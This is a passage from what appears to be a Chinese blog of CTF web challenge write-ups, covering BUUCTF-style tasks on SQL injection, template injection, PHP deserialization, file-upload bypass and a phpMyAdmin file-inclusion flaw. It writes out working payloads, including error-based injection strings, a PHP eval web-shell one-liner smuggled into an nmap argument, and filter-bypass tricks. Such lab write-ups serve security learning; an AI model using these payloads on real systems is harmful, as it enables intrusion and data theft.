src="https://tvax4.sinaimg.cn/large/007u7C9Rgy1gisfwss67oj310y027wek.jpg" alt=""><br>最后在源码中获得flag。</p><h2 id="CISCN2019-华北赛区-Day2-Web1-Hack-World"><a href="#CISCN2019-华北赛区-Day2-Web1-Hack-World" class="headerlink" title="[CISCN2019 华北赛区 Day2 Web1]Hack World"></a>[CISCN2019 华北赛区 Day2 Web1]Hack World</h2><p>发现只有输入1和2还有1/1等才不会错误，尝试许多注入的方式发现都会被检测出来，百度之后发现本题需要用二分法来跑。<br>在网上找了很多代码，才找到一个能正确跑出flag的脚本：<br><img src="https://tva4.sinaimg.cn/large/007u7C9Rgy1gisgobetzjj30qr0jzab6.jpg" alt=""><br><img src="https://tvax1.sinaimg.cn/large/007u7C9Rgy1gisgs87e18j30ex04emxe.jpg" alt=""><br>成功跑出flag。<br>但是测试发现该flag少一个数，最终flag:<br>flag{88beaa12-81a3-4445-bcee-8e89cf1d356c}</p><p>参考：<a href="https://blog.csdn.net/weixin_43900387/article/details/104838055" target="_blank" rel="noopener">https://blog.csdn.net/weixin_43900387/article/details/104838055</a></p><h2 id="强网杯-2019-高明的黑客"><a href="#强网杯-2019-高明的黑客" class="headerlink" title="[强网杯 2019]高明的黑客"></a>[强网杯 2019]高明的黑客</h2><p>打开后便提示了网页备份文件。<br><img src="https://tva1.sinaimg.cn/large/007u7C9Rgy1gishlqb21gj30ml055wf0.jpg" alt=""><br>解压后发现居然有3002个文件，并且每个文件内容很多，而且还有很多shell，但不是每个shell都能使用。<br><img src="https://tvax1.sinaimg.cn/large/007u7C9Rgy1gisk2z2tv1j30l60kugnt.jpg" alt=""><br><img src="https://tva4.sinaimg.cn/large/007u7C9Rgy1gisk3bntwyj30ns0gwmyq.jpg" alt=""><br>百度一下，使用了一下大佬的脚本。<br><img src="https://tva2.sinaimg.cn/large/007u7C9Rgy1gisk4sslvdj30nr033jrg.jpg" alt=""><br>经过一段时间把可以利用shell的php文件跑出来了。<br><img src="https://tvax3.sinaimg.cn/large/007u7C9Rgy1gisk62t3blj31f90l2gp4.jpg" alt=""><br>于是构造payload:</p><p><a href="http://c572dc92-c543-4f1c-a48d-459dc705a5b3.node3.buuoj.cn/xk0SzyKwfzw.php?Efa5BVG=cat" target="_blank" rel="noopener">http://c572dc92-c543-4f1c-a48d-459dc705a5b3.node3.buuoj.cn/xk0SzyKwfzw.php?Efa5BVG=cat</a> /flag 获得flag。</p><p>参考：<br><a href="https://www.freesion.com/article/9565243932/" target="_blank" rel="noopener">https://www.freesion.com/article/9565243932/</a></p><h2 id="极客大挑战-2019-HardSQL"><a href="#极客大挑战-2019-HardSQL" class="headerlink" title="[极客大挑战 2019]HardSQL"></a>[极客大挑战 2019]HardSQL</h2><p><img src="https://tva2.sinaimg.cn/large/007u7C9Rgy1gisuzqei6yj316c0it12s.jpg" alt=""><br>经过测试发现本题要使用报错注入的方式进行注入。而且本题过滤了空格，and还有=号，但or可以使用，而且用括号可以绕过空格，用like可以绕过=号。<br>构造payload:username=admin’or(updatexml(1,concat(0x7e,database(),0x7e),1))%23&amp;password=123<br>查到数据库。<br><img src="https://tvax3.sinaimg.cn/large/007u7C9Rgy1gisv7mfj0ij310b0jpaje.jpg" alt=""><br>username=admin’or(updatexml(1,concat(0x7e,(select(group_concat(table_name))from(information_schema.tables)where(table_schema)like(‘geek’)),0x7e),1))%23&amp;password=123<br>获得表名H4rDsq1。<br><img src="https://tvax2.sinaimg.cn/large/007u7C9Rgy1gisv9g5qv3j312n0i1gv3.jpg" alt=""><br>username=admin’or(updatexml(1,concat(0x7e,(select(group_concat(column_name))from(information_schema.columns)where(table_name)like(‘H4rDsq1’)),0x7e),1))%23&amp;password=123<br>获得列名。<br><img src="https://tvax2.sinaimg.cn/large/007u7C9Rgy1gisvb1lo1mj31a60hagw4.jpg" alt=""><br>username=admin’or(updatexml(1,concat(0x7e,(select(group_concat(password))from(H4rDsq1)),0x7e),1))%23&amp;password=123<br>获得flag。这样只能得到flag的左半段，在password前面加上right获得flag右半段。</p><h2 id="BJDCTF-2nd-fake-google"><a href="#BJDCTF-2nd-fake-google" class="headerlink" title="[BJDCTF 2nd]fake google"></a>[BJDCTF 2nd]fake google</h2><p><img src="https://tva4.sinaimg.cn/large/007u7C9Rgy1gisvpx4iz6j30lk03fdfs.jpg" alt=""><br>随便输入一个数字后，打开源码发现题目有提示，根据提示可知本题应该是ssti模板注入。<br>尝试4输出的结果是4，证明确实是模板注入。<br>参考别人的wp，找到了一条可以执行的payload:<br><img src="https://tva1.sinaimg.cn/large/007u7C9Rgy1giswcnupuqj317i021glj.jpg" alt=""><br>执行命令ls找到flag在根目录下，执行cat /flag获得flag。</p><p>参考：<a href="https://blog.csdn.net/ChenZIDu/article/details/105159197" target="_blank" rel="noopener">https://blog.csdn.net/ChenZIDu/article/details/105159197</a></p><p><a href="https://www.cnblogs.com/20175211lyz/p/11425368.html" target="_blank" rel="noopener" title="CTF SSTI(服务器模板注入)">https://www.cnblogs.com/20175211lyz/p/11425368.html</a></p><h2 id="GXYCTF2019-BabySQli"><a href="#GXYCTF2019-BabySQli" class="headerlink" title="[GXYCTF2019]BabySQli"></a>[GXYCTF2019]BabySQli</h2><p><img src="https://tva4.sinaimg.cn/large/007u7C9Rgy1gitotlofy5j30ss0533yo.jpg" alt=""><br>打开题目查看源码，发现一段base32编码，解密后得到base64编码：c2VsZWN0ICogZnJvbSB1c2VyIHdoZXJlIHVzZXJuYW1lID0gJyRuYW1lJw==再解码得到一段提示信息：select * from user where username = ‘$name’。说明username处存在注入点。<br><img src="https://tva1.sinaimg.cn/large/007u7C9Rgy1gitpfhwsfwj30y50b3gn1.jpg" alt=""><br>抓包进行分析，本题将or过滤了，但是可以用大写绕过，测试后发现有3个字段。<br>百度了下，知道了一点联合注入的知识点，当联合查询不存在数据时，联合查询就会构造一个虚拟的数据。还知道本题密码是用md5加密的。<br>经过测试，发现二号位是username，三号位是password。<br><img src="https://tvax2.sinaimg.cn/large/007u7C9Rgy1gitpossrioj30sb05pq3i.jpg" alt="">‘构造一个虚假的身份从而获得flag。</p><h2 id="网鼎杯-2020-青龙组-AreUSerialz"><a href="#网鼎杯-2020-青龙组-AreUSerialz" class="headerlink" title="[网鼎杯 2020 青龙组]AreUSerialz"></a>[网鼎杯 2020 青龙组]AreUSerialz</h2><p><img src="https://tva1.sinaimg.cn/large/007u7C9Rgy1gitpu38sj6j30qa0p6di4.jpg" alt=""><br><img src="https://tvax4.sinaimg.cn/large/007u7C9Rgy1gitpuczb8yj30of0p5761.jpg" alt=""><br>审计代码可知，传入的str中的每一个字符串的ASCII范围在32到125之间，才会对其反序列化。<br>这里的file_put_contents()函数，将$this-&gt;content写入$this-&gt;filename中。</p><p><img src="https://tvax3.sinaimg.cn/large/007u7C9Rgy1gitqs7f2stj30ce05274a.jpg" alt=""></p><p>在反序列化过程中，调用了__destruct析构的方法，其中op===”2”是强比较，需要进行类型的比较。<br><img src="https://tva2.sinaimg.cn/large/007u7C9Rgy1gitqvqjoixj30fd06y0t3.jpg" alt=""><br>在process方法中op与字符的比较为弱类型比较，所以让op=2，则op===”2”为false，op==”2”为true。<br><img src="https://tva4.sinaimg.cn/large/007u7C9Rgy1gitqz76gc1j30id05eaa7.jpg" alt=""><br>read方法中，使用了file_get_contents函数读取文件，可以使用php://filter伪协议读取flag文件。读取的flag用output函数输出。</p><p>由于$op，$filename和$content三个变量都是protected，在序列化有%00，ASCII是0，不能通过is_valid函数的检测。<br><img src="https://tva3.sinaimg.cn/large/007u7C9Rgy1gitra5wrmzj30ow0d2q3n.jpg" alt=""><br>php7.1+版本对属性类型不敏感。所以可以直接改为public进行绕过。<br><img src="https://tvax2.sinaimg.cn/large/007u7C9Rgy1gitrbrjf72j31ci0hqq52.jpg" alt=""><br>构造payload:<code>?str=O:11:&quot;FileHandler&quot;:3:{s:2:&quot;op&quot;;i:2;s:8:&quot;filename&quot;;s:52:&quot;php://filter/convert.base64-encode/resource=flag.php&quot;;s:7:&quot;content&quot;;N;}</code><br>成功获得flag。</p><p>参考：<a href="https://www.cnblogs.com/Cl0ud/p/12874458.html" target="_blank" rel="noopener">https://www.cnblogs.com/Cl0ud/p/12874458.html</a></p><h2 id="RoarCTF-2019-Easy-Java"><a href="#RoarCTF-2019-Easy-Java" class="headerlink" title="[RoarCTF 2019]Easy Java"></a>[RoarCTF 2019]Easy Java</h2><p><img src="https://tva4.sinaimg.cn/large/007u7C9Rgy1gitrlb8t0bj30mp04aglq.jpg" alt=""><br>点击help，弹出一条错误信息，应该是有help.docx这个文件。<br><img src="https:/large/tva4.sinaimg.cn//007u7C9Rgy1gitrndl7y7j30a101vglk.jpg" alt=""><br>下载的文件用编辑打开发现是pk开头的，所以是压缩包文件，解压后得到一堆文件，发现并没什么用。<br>百度后知道了这题考查的知识点：<br><img src="https://tvax3.sinaimg.cn/large/007u7C9Rgy1gitrzd05saj30sd07g759.jpg" alt=""><br>POST传入filename=WEB-INF/web.xml下载web.xml文件。<br><img src="https://tva2.sinaimg.cn/large/007u7C9Rgy1gits3vi33lj31010otwgm.jpg" alt=""><br>看到com.wm.ctf.FlagController。<br>根据tomcat的项目存放路径推测出FlagController.class的位置。<br>构造payload:<code>filename=WEB-INF/classes/com/wm/ctf/FlagController.class</code><br>下载FlagController.class文件。<br><img src="https://tva1.sinaimg.cn/large/007u7C9Rgy1gitsbia0sfj30s305q0sw.jpg" alt=""><br>打开看到一串base64编码，解密后就是flag。</p><p>参考：<a href="https://www.cnblogs.com/wangtanzhi/p/12173215.html" target="_blank" rel="noopener">https://www.cnblogs.com/wangtanzhi/p/12173215.html</a></p><h2 id="BUUCTF-2018-Online-Tool"><a href="#BUUCTF-2018-Online-Tool" class="headerlink" title="[BUUCTF 2018]Online Tool"></a>[BUUCTF 2018]Online Tool</h2><p><img src="https://tvax2.sinaimg.cn/large/007u7C9Rgy1gitsnc7frsj30n00cn3zr.jpg" alt=""><br>mkdir之前的@意思是压制错误提示，使其无错误提示。</p><p>chdir()函数改变当前的目录。</p><p>escapeshellarg和escapeshellcmd参考：<a href="https://paper.seebug.org/164/" target="_blank" rel="noopener" title="PHP escapeshellarg()+escapeshellcmd() 之殇">https://paper.seebug.org/164/</a><br><img src="https://tvax4.sinaimg.cn/large/007u7C9Rgy1gitt1t51ggj30t90brdiu.jpg" alt=""><br>最后一句system可以传参数，所以肯定是利用这里构造payload。</p><p>在nmap命令中 有一个参数-oG可以实现将命令和结果写到文件。<br>所以构造payload:<code>?host=&#39; &lt;?php @eval($_POST[&quot;hack&quot;]);?&gt; -oG hack.php &#39;</code><br><img src="https://tva3.sinaimg.cn/large/007u7C9Rgy1gitu49i24oj30f204sq31.jpg" alt=""><br>配置蚁剑，连接之后在根目录找到flag。</p><p>参考：<a href="https://blog.csdn.net/qq_26406447/article/details/100711933" target="_blank" rel="noopener">https://blog.csdn.net/qq_26406447/article/details/100711933</a></p><h2 id="GYCTF2020-Blacklist"><a href="#GYCTF2020-Blacklist" class="headerlink" title="[GYCTF2020]Blacklist"></a>[GYCTF2020]Blacklist</h2><p><img src="https://tva3.sinaimg.cn/large/007u7C9Rgy1gitvpk0raij30vi05w3yt.jpg" alt=""><br>发现本题和之前的[强网杯 2019]随便注类似，但是看了下过滤，发现alter和rename都被过滤了。<br>百度了下，发现本题可以用一个新的方法。</p><p>参考：<a href="https://dev.mysql.com/doc/refman/8.0/en/handler.html" target="_blank" rel="noopener" title="官方文档">https://dev.mysql.com/doc/refman/8.0/en/handler.html</a></p><p>所以构造payload:<br>1’;handler FlagHere open;handler FlagHere read first;handler FlagHere close;#<br>获得flag。</p><h2 id="BJDCTF-2nd-old-hack"><a href="#BJDCTF-2nd-old-hack" class="headerlink" title="[BJDCTF 2nd]old-hack"></a>[BJDCTF 2nd]old-hack</h2><p>本题知识点：thinkphp 5.0.23 RCE漏洞<br><img src="https://tvax4.sinaimg.cn/large/007u7C9Rgy1gitx18uw2bj30nr0333ym.jpg" alt=""><br>构造?s=123即可在报错信息中看到thinkphp的版本号。</p><p>参考：<a href="https://xz.aliyun.com/t/3845" target="_blank" rel="noopener" title="ThinkPHP 5.0.0~5.0.23 RCE 漏洞分析">https://xz.aliyun.com/t/3845</a><br><img src="https://tva1.sinaimg.cn/large/007u7C9Rgy1gitxd4g2mwj30rv0dzt9v.jpg" alt=""><br>构造payload查看根目录发现flag。<br>使用cat /flag命令获得flag。</p><h2 id="De1CTF-2019-SSRF-Me"><a href="#De1CTF-2019-SSRF-Me" class="headerlink" title="[De1CTF 2019]SSRF Me"></a>[De1CTF 2019]SSRF Me</h2><p>打开题目发现一堆代码，而且还很乱，需要整理一下。<br><img src="https://tvax2.sinaimg.cn/large/007u7C9Rgy1gityx5zqrvj30p70ontab.jpg" alt=""><br><img src="https://tva3.sinaimg.cn/large/007u7C9Rgy1gityxg8ze2j30kw0oktah.jpg" alt=""><br><img src="https://tvax3.sinaimg.cn/large/007u7C9Rgy1gityxrsi9jj30le0f3dgj.jpg" alt=""><br>os.urandom:随即产生n个字节的字符串</p><p>os.path.exists(path): 如果路径 path 存在，返回 True；如果路径 path 不存在，返回 False。 </p><p>@app.route(‘/‘):Flask路由(根目录路由器)</p><p>urllib.unquote:将字符串中的url编码解码。</p><p>json.dumps：Python 对象编码成 JSON 字符串</p><p>urllib.urlopen：创建一个表示远程url的类文件对象，然后像本地文件一样操作这个类文件对象来获取远程数据。</p><p>hashlib.md5().hexdigest()：hashlib.md5()#获取一个md5加密算法对象，hexdigest()是获得加密好的16进制字符串。<br><img src="https://tva1.sinaimg.cn/large/007u7C9Rgy1gitzy0e6qrj30ik06g74n.jpg" alt=""><br>向/De1ta路由提交参数后，会执行challenge函数，绕过waf检测后会创建Task类执行Exec函数。</p><p>所以需要通过checkSign函数的检测即通过getSign函数的检测。<br>只有向/geneSign路由提交参数后才能返回getSign获得正确的sign值从而绕过getSign的检测。<br><img src="https://tva2.sinaimg.cn/large/007u7C9Rgy1giu0gsvqf3j30t90js0tm.jpg" alt=""><br>构造payload:geneSign?param=flag.txtread获得sign值bbf07a512ad05225d0744b68e2830cb0。<br><img src="https://tvax1.sinaimg.cn/large/007u7C9Rgy1giu0ppozjvj30p40kbgmg.jpg" alt=""><br>构造payload:De1ta?param=flag.txt并且传入cookie:action值为readscan,sign值为bbf07a512ad05225d0744b68e2830cb0。从而获得flag。action包含”scan”则会修改code的值为，action包含”read”并且code为200时才会写入flag。</p><p>参考：<a href="https://blog.csdn.net/weixin_43900387/article/details/105278192" target="_blank" rel="noopener">https://blog.csdn.net/weixin_43900387/article/details/105278192</a></p><h2 id="GXYCTF2019-禁止套娃"><a href="#GXYCTF2019-禁止套娃" class="headerlink" title="[GXYCTF2019]禁止套娃"></a>[GXYCTF2019]禁止套娃</h2><p>本题考查的是无参数RCE。eval($_GET[‘exp’]);</p><p>1.利用超全局变量进行bypass，进行RCE</p><p>2.进行任意文件读取</p><p>本题另外一个知识点是.git源码泄露，利用GitHack进行扫描。<br><img src="https://tva3.sinaimg.cn/large/007u7C9Rgy1giuxlx7q4dj30rr02waa4.jpg" alt=""><br>发现index.php文件。<br><img src="https://tvax2.sinaimg.cn/large/007u7C9Rgy1giuxnej7d3j30q20e575e.jpg" alt=""><br>发现是本题的源码index.php。</p><p>审计代码可知本题过滤了一些比较常用的伪协议，所以不能直接读取文件了。<br><img src="https://tva3.sinaimg.cn/large/007u7C9Rgy1giuxzgh3zrj30t502lgln.jpg" alt=""><br><img src="https://tvax4.sinaimg.cn/large/007u7C9Rgy1giuy9d8orgj30on02lq2y.jpg" alt=""><br>正则匹配[a-z,_]+((?R)?)，所以只允许a(b(c()))，a()等这样的形式，所以就不能传参。</p><p>首先得想办法爆出文件的目录下的文件，利用scandir()函数可以扫描当前目录下的文件，所以会想构造print_r(scandir(‘.’)),而本题不能传参。</p><p>所以有另外一个函数localeconv()，localeconv() 函数返回一包含本地数字及货币格式信息的数组。而数组的话就要用到current() 函数,post()是current()的别名。<br><img src="https://tva2.sinaimg.cn/large/007u7C9Rgy1giuz2mu7kkj30ow0lpabv.jpg" alt=""><br><img src="https://tva4.sinaimg.cn/large/007u7C9Rgy1giuz55lbmhj30uq0jjq3x.jpg" alt=""><br>这样就爆出了当前的目录。所以我们要得到倒数第二个数组的内容。<br>所以可以利用array_reverse()函数，以相反的元素顺序返回数组。<br>顺序颠倒后flag.php在第二个数组中，所以构造payload:<br><code>?exp=print_r(next(array_reverse(scandir(current(localeconv())))))</code>;但是这样只能打印变量，而不能读flag.php的源码，而且file_get_contents()中的et被过滤了，但是可以使用readfile()，highlight_file()获得show_resource()函数读取flag。其他方法参考下面的博客。</p><p>参考：<a href="https://skysec.top/2019/03/29/PHP-Parametric-Function-RCE/#%E4%BB%80%E4%B9%88%E6%98%AF%E6%97%A0%E5%8F%82%E6%95%B0%E5%87%BD%E6%95%B0RCE" target="_blank" rel="noopener">https://skysec.top/2019/03/29/PHP-Parametric-Function-RCE/#%E4%BB%80%E4%B9%88%E6%98%AF%E6%97%A0%E5%8F%82%E6%95%B0%E5%87%BD%E6%95%B0RCE</a><br><a href="https://www.cnblogs.com/wangtanzhi/p/12260986.html" target="_blank" rel="noopener">https://www.cnblogs.com/wangtanzhi/p/12260986.html</a></p><h2 id="MRCTF2020-你传你🐎呢"><a href="#MRCTF2020-你传你🐎呢" class="headerlink" title="[MRCTF2020]你传你🐎呢"></a>[MRCTF2020]你传你🐎呢</h2><p>打开题目是上传文件，尝试上传一句话木马的jpg文件上传成功，修改文件后缀为php被检测出来了，尝试php3,php4,php5,phtml,pht绕过检测发现都不可以，说明本题只能上传图片。</p><p>所以想到上传.htaccess，让.htaccess解析图片为php文件运行木马。<br><img src="https://tva3.sinaimg.cn/large/007u7C9Rgy1giv2m4pw6gj30w70dsdjg.jpg" alt=""></p><p>可以在.htaccess 加入php解析规则</p><p>类似于把文件名包含1的解析成php</p><pre><code>&lt;FilesMatch &quot;1&quot;&gt;SetHandler application/x-httpd-php&lt;/FilesMatch&gt;</code></pre><p><img src="https://tva2.sinaimg.cn/large/007u7C9Rgy1giv2h16eiuj30wf0d5abr.jpg" alt=""><br>不是图片不能上传，修改Content-Type为image/jpeg上传成功。<br><img src="https://tva4.sinaimg.cn/large/007u7C9Rgy1giv2j3rhr0j30pl04nmxj.jpg" alt=""><br>上传带木马的图片文件。<br><img src="https://tvax2.sinaimg.cn/large/007u7C9Rgy1giv2kjbk3ej30pc0bi3zf.jpg" alt=""><br>在根目录下获得flag。</p><h2 id="安洵杯-2019-easy-web"><a href="#安洵杯-2019-easy-web" class="headerlink" title="[安洵杯 2019]easy_web"></a>[安洵杯 2019]easy_web</h2><p><img src="https://tvax3.sinaimg.cn/large/007u7C9Rgy1giv35h4xwoj30n503rweu.jpg" alt=""><br>打开源码，发现题目给的提示md5，并且源码中img中的内容是图片的base64编码。<br><img src="https://tva2.sinaimg.cn/large/007u7C9Rgy1giv3jjq8lhj30sd028jrg.jpg" alt=""><br>感觉img中那段编码是base64编码。</p><p><img src="https://tva4.sinaimg.cn/large/007u7C9Rgy1giv3lrgqapj308p02h0sl.jpg" alt=""></p><p>经过两次base64解码和一次hex解码后得到img的名字为555.png，所以可以尝试利用类似的方法读取文件。</p><p><img src="https://tva1.sinaimg.cn/large/007u7C9Rgy1giv3ovzb3sj30aq03bwee.jpg" alt=""><br><img src="https://tvax4.sinaimg.cn/large/007u7C9Rgy1giv3poldw0j30xy0j8juy.jpg" alt=""><br>尝试读取flag.php，应该是被过滤了所以不能查看。</p><p><img src="https://tvax1.sinaimg.cn/large/007u7C9Rgy1giv3v2vvb6j30a902qa9y.jpg" alt=""></p><p>尝试读取index.php文件获得题目源码。执行后在img中得到index.php文件的base64编码。</p><pre><code>&lt;?phperror_reporting(E_ALL || ~ E_NOTICE);header(&apos;content-type:text/html;charset=utf-8&apos;);$cmd = $_GET[&apos;cmd&apos;];if (!isset($_GET[&apos;img&apos;]) || !isset($_GET[&apos;cmd&apos;]))     header(&apos;Refresh:0;url=./index.php?img=TXpVek5UTTFNbVUzTURabE5qYz0&amp;cmd=&apos;);$file = hex2bin(base64_decode(base64_decode($_GET[&apos;img&apos;])));$file = preg_replace(&quot;/[^a-zA-Z0-9.]+/&quot;, &quot;&quot;, $file);if (preg_match(&quot;/flag/i&quot;, $file)) {    echo &apos;&lt;img src =&quot;./ctf3.jpeg&quot;&gt;&apos;;    die(&quot;xixi～ no flag&quot;);} else {    $txt = base64_encode(file_get_contents($file));    echo &quot;&lt;img src=&apos;data:image/gif;base64,&quot; . $txt . &quot;&apos;&gt;&lt;/img&gt;&quot;;    echo &quot;&lt;br&gt;&quot;;}echo $cmd;echo &quot;&lt;br&gt;&quot;;if (preg_match(&quot;/ls|bash|tac|nl|more|less|head|wget|tail|vi|cat|od|grep|sed|bzmore|bzless|pcre|paste|diff|file|echo|sh|\&apos;|\&quot;|\`|;|,|\*|\?|\\|\\\\|\n|\t|\r|\xA0|\{|\}|\(|\)|\&amp;[^\d]|@|\||\\$|\[|\]|{|}|\(|\)|-|&lt;|&gt;/i&quot;, $cmd)) {    echo(&quot;forbid ~&quot;);    echo &quot;&lt;br&gt;&quot;;} else {if ((string)$_POST[&apos;a&apos;] !== (string)$_POST[&apos;b&apos;] &amp;&amp; md5($_POST[&apos;a&apos;]) === md5($_POST[&apos;b&apos;])) {    echo `$cmd`;} else {    echo (&quot;md5 is funny ~&quot;);    }}?&gt;</code></pre><p>解码后获得本题源码。</p><pre><code>if ((string)$_POST[&apos;a&apos;] !== (string)$_POST[&apos;b&apos;] &amp;&amp; md5($_POST[&apos;a&apos;]) === md5($_POST[&apos;b&apos;])) {echo `$cmd`;} else {echo (&quot;md5 is funny ~&quot;);}</code></pre><p>经过这一层的判断，才会运行cmd命令。反引号符号包围是执行shell命令。<br>md5进行强比较时是可以通过数组绕过的，但是这里将数据进行了强制转换，所以用数组前半部分就不能通过判断。<br><img src="https://tva3.sinaimg.cn/large/007u7C9Rgy1giv5rtg6mtj31h00ekdi4.jpg" alt=""></p><p>参考：<a href="https://xz.aliyun.com/t/2232" target="_blank" rel="noopener">https://xz.aliyun.com/t/2232</a><br>利用MD5碰撞生成器构建两个MD5一样，但是内容完全不一样的字符串。<br><img src="https://tva1.sinaimg.cn/large/007u7C9Rgy1giv5ug9muhj31by0f4mzw.jpg" alt=""><br>上传之后从而绕过检测执行命令，即可看到根目录下有flag，但是cat被过滤了，所以使用ca\t%20flag获得flag。<br><img src="https://tva4.sinaimg.cn/large/007u7C9Rgy1giv5xxzfxvj31bf0e6wh4.jpg" alt=""></p><h2 id="MRCTF2020-Ez-bypass"><a href="#MRCTF2020-Ez-bypass" class="headerlink" title="[MRCTF2020]Ez_bypass"></a>[MRCTF2020]Ez_bypass</h2><pre><code>include &apos;flag.php&apos;;$flag=&apos;MRCTF{xxxxxxxxxxxxxxxxxxxxxxxxx}&apos;;if(isset($_GET[&apos;gg&apos;])&amp;&amp;isset($_GET[&apos;id&apos;])) {    $id=$_GET[&apos;id&apos;];    $gg=$_GET[&apos;gg&apos;];    if (md5($id) === md5($gg) &amp;&amp; $id !== $gg) {        echo &apos;You got the first step&apos;;        if(isset($_POST[&apos;passwd&apos;])) {               $passwd=$_POST[&apos;passwd&apos;];            if (!is_numeric($passwd))            {                if($passwd==1234567)                {                     echo &apos;Good Job!&apos;;                     highlight_file(&apos;flag.php&apos;);                    die(&apos;By Retr_0&apos;);                }                else                 {                     echo &quot;can you think twice??&quot;;                 }            }            else{                echo &apos;You can not get it !&apos;;            }            }            else{                die(&apos;only one way to get the flag&apos;);        }}        else {        echo &quot;You are not a real hacker!&quot;;        }}else{    die(&apos;Please input first&apos;);}</code></pre><p>根据提示，直接F12得到源码。</p><p>审计代码可知，第一步需要绕过md5，这里不像上一题会转换类型，所以可以直接使用数组绕过，md5()无法操作数组，会返回null。<br>第二步便是要绕过passwd的检测，is_numeric可以使用1234567;绕过，由于$passwd==1234567是若比较，所以在比较时会把passwd转成数字进行比较，所以就能绕过检测，获得flag。</p><h2 id="BJDCTF2020-Mark-loves-cat"><a href="#BJDCTF2020-Mark-loves-cat" class="headerlink" title="[BJDCTF2020]Mark loves cat"></a>[BJDCTF2020]Mark loves cat</h2><p><img src="https://tva3.sinaimg.cn/large/007u7C9Rgy1givvqshbrbj30pw075gm6.jpg" alt=""><br><img src="https://tvax1.sinaimg.cn/large/007u7C9Rgy1givwfshwfgj307g01qjr6.jpg" alt=""></p><p>使用dirsearch扫出/.git目录，所以使用GitHack获得本题git泄露的源码。</p><pre><code>&lt;?php$flag = file_get_contents(&apos;/flag&apos;);</code></pre><p>flag.php的代码。</p><pre><code>&lt;?phpinclude &apos;flag.php&apos;;$yds = &quot;dog&quot;;$is = &quot;cat&quot;;$handsome = &apos;yds&apos;;foreach($_POST as $x =&gt; $y){$$x = $y;}foreach($_GET as $x =&gt; $y){$$x = $$y;}foreach($_GET as $x =&gt; $y){if($_GET[&apos;flag&apos;] === $x &amp;&amp; $x !== &apos;flag&apos;){exit($handsome);}}if(!isset($_GET[&apos;flag&apos;]) &amp;&amp; !isset($_POST[&apos;flag&apos;])){exit($yds);}if($_POST[&apos;flag&apos;] === &apos;flag&apos;  || $_GET[&apos;flag&apos;] === &apos;flag&apos;){exit($is);}echo &quot;the flag is: &quot;.$flag;</code></pre><p>index.php文件中的代码。<br>审计代码可知，我们最终应该要让运行exit($flag)从而获得flag。<br>这里我们可以利用$yds，通过构造从而获得flag。</p><p>可以直接get传参?yds=flag</p><pre><code>foreach($_GET as $x =&gt; $y){$$x = $$y;}</code></pre><p>变成了$yds=$flag</p><pre><code>if(!isset($_GET[&apos;flag&apos;]) &amp;&amp; !isset($_POST[&apos;flag&apos;])){exit($yds);}</code></pre><p>get的是yds所以可以绕过执行exit($flag)。</p><h2 id="GXYCTF2019-BabyUpload"><a href="#GXYCTF2019-BabyUpload" class="headerlink" title="[GXYCTF2019]BabyUpload"></a>[GXYCTF2019]BabyUpload</h2><p><img src="https://tva2.sinaimg.cn/large/007u7C9Rgy1givy1v2zepj30fr02z3yf.jpg" alt=""><br>尝试上传带有一句话木马的jpg文件，被检测到了，估计是过滤了&lt;?php，所以想到使用script代替。</p><pre><code>&lt;script language=&quot;php&quot;&gt; eval($_POST[&apos;hack&apos;]) &lt;/script&gt;</code></pre><p>抓包修改后缀为php，被检测到显示后缀不能有ph，所以使用php3等这样的绕过都不行了，于是想到上传.htaccess。<br><img src="https://tva3.sinaimg.cn/large/007u7C9Rgy1givy6uwruaj30cb037mx1.jpg" alt=""><br>直接上传不能上传，所以抓包修改文件类型为image/jpeg上传成功，然后上传带木马的jpg文件，用蚁剑连接。<br><img src="https://tva3.sinaimg.cn/large/007u7C9Rgy1givy95zcsfj30r40att9l.jpg" alt=""><br>根目录下找到flag。</p><h2 id="GWCTF-2019-我有一个数据库"><a href="#GWCTF-2019-我有一个数据库" class="headerlink" title="[GWCTF 2019]我有一个数据库"></a>[GWCTF 2019]我有一个数据库</h2><p><img src="https://tva3.sinaimg.cn/large/007u7C9Rgy1givyud6ezaj30c60a8jrv.jpg" alt=""></p><p>通过dirsearch发现存在robots.txt文件和phpinfo.php，而且还有phpmyadmin。打开robots.txt就是提示有phpinfo.php。<br><img src="https://tvax2.sinaimg.cn/large/007u7C9Rgy1givyxt3wlaj31f40jk428.jpg" alt=""><br>打开phpmyadmin界面，直接就进去了。<br><img src="https://tvax4.sinaimg.cn/large/007u7C9Rgy1givz2nxhlvj30ao03pmx4.jpg" alt=""></p><p>看到个phpMyAdmin的版本，所以百度一下这个版本的漏洞。<br>参考：<br><a href="https://mp.weixin.qq.com/s?__biz=MzIzMTc1MjExOQ==&mid=2247485036&idx=1&sn=8e9647906c5d94f72564dec5bc51a2ab&chksm=e89e2eb4dfe9a7a28bff2efebb5b2723782dab660acff074c3f18c9e7dca924abdf3da618fb4&mpshare=1&scene=1&srcid=0621gAv1FMtrgoahD01psMZr&pass_ticket=LqhRfckPxAVG2dF/jxV/9/cEb5pShRgewJe/ttJn2gIlIyGF/bsgGmzcbsV%2bLmMK#rd" target="_blank" rel="noopener" title="phpmyadmin4.8.1后台getshell ">https://mp.weixin.qq.com/s?__biz=MzIzMTc1MjExOQ==&amp;mid=2247485036&amp;idx=1&amp;sn=8e9647906c5d94f72564dec5bc51a2ab&amp;chksm=e89e2eb4dfe9a7a28bff2efebb5b2723782dab660acff074c3f18c9e7dca924abdf3da618fb4&amp;mpshare=1&amp;scene=1&amp;srcid=0621gAv1FMtrgoahD01psMZr&amp;pass_ticket=LqhRfckPxAVG2dF/jxV/9/cEb5pShRgewJe/ttJn2gIlIyGF/bsgGmzcbsV%2bLmMK#rd</a><br><a href="https://www.jianshu.com/p/fb9c2ae16d09" target="_blank" rel="noopener" title="cve-2018-12613-PhpMyadmin后台文件包含">https://www.jianshu.com/p/fb9c2ae16d09</a></p><p>构造payload:</p><pre><code>index.php?target=db_datadict.php%253f/../../../../../../../../flag</code></pre><p>即可获得flag。</p><h2 id="BJDCTF-2nd-假猪套天下第一"><a href="#BJDCTF-2nd-假猪套天下第一" class="headerlink" title="[BJDCTF 2nd]假猪套天下第一"></a>[BJDCTF 2nd]假猪套天下第一</h2><p>进去发现是一个登录界面，使用admin登录会提示不是admin，除了admin以外的账号都能登录，登录进去也没看到什么，于是在登录时抓包分析。<br><img src="https://tva4.sinaimg.cn/large/007u7C9Rgy1givzw7kh2ij30eg05k0sr.jpg" alt=""></p><p>发现题目的提示。<br><img src="https://tva4.sinaimg.cn/large/007u7C9Rgy1givzz6wfooj31ar0e60ti.jpg" alt=""><br>进去刷新一下页面就变成这样了，于是抓包分析。<br><img 